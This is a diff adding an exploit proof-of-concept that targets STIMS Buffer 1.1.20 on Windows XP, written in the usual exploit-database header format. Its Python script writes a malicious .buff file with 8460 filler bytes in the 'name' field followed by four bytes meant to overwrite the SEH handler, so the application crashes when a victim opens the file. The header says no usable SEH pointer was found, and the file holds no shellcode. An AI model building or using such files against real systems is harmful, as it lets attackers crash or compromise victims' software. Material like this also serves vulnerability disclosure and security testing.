@@ -1,0 +1,62 @@
+# Exploit Title: STIMS BUFFER OVERFLOW SEH OVERWRITE
+# Date: 19 Feb 2016
+# Exploit Author: Ishita Sailor <ishitasailor@gmail.com>
+# Vendor Homepage: http://www.stimslabs.com/
+# Software Link: http://www.stimslabs.com/en/buffer/STIMSBufferEnSetup.exe
+# Version: 1.1.20
+# Tested on: Windows XP SP3
+# CVE : UNKNOWN
+# ==============HOW TO CRASH ==================
+#make the buff file and open it it the STIMSBuffer application.
+#Click on View Report
+#===========================================
+#Problems in exploitation
+#Unable to find suitable SEH pointer
+#
+
+
+#!/usr/bin/env python
+f=open("crash.buff","w")
+payload="""<!--block:#solution-->
+[solution]
+name="""
+payload +="\x41"*8460
+payload +="\x42"*4 #SEH overwrite
+
+payload +="""desc=asdasdasd
+time=0
+version=1
+file=C:\Documents and Settings\IEUser\Desktop\z.buff
+time.created=131003052796300000
+app=1.1.1
+projects=1
+time.last=131003052894110000
+<!--#solution:block-->
+<!--block:Buffer 1-->
+[properties]
+buffer.id=0
+buffer.name=Maleic acid / sodium hydrogen maleate
+buffer.desc=Maleic acid / sodium hydrogen maleate with pKa 2
+buffer.inp.pka=2.00000
+buffer.inp.vol=1000.000000
+buffer.inp.ph=2.000000
+buffer.inp.conc=1.000000
+buffer.inp.temp=24.000000
+buffer.out.strength=0.592637
+buffer.out.sln1.name=Maleic acid
+buffer.out.sln1.conc=3.000000
+buffer.out.sln1.vol=135.787622
+buffer.out.sln2.name=Sodium hydrogen maleate
+buffer.out.sln2.conc=3.000000
+buffer.out.sln2.vol=197.545712
+buffer.out.water=1000.000000
+comment=
+comment.active=0
+notes=
+notes.active=0
+name=Buffer 1
+active=1
+<!--Buffer 1:block-->
+"""
+f.write(payload)
+f.close()
